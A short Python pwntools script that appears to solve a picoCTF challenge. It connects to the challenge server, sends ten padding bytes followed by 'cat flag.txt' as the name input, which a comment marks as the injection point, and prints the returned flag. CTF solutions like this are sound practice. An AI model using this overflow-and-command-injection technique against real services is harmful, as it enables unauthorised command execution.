from pwn import *

HOST = "amiable-citadel.picoctf.net"
PORT = 50945

p = remote(HOST, PORT)
p.recvuntil(b"name?")
p.recvline()

name = b"a"*10 + b"cat flag.txt\n" # Injection happens here
p.sendline(name) 

byeline = p.recvline()
flag = p.recvline()
print(flag)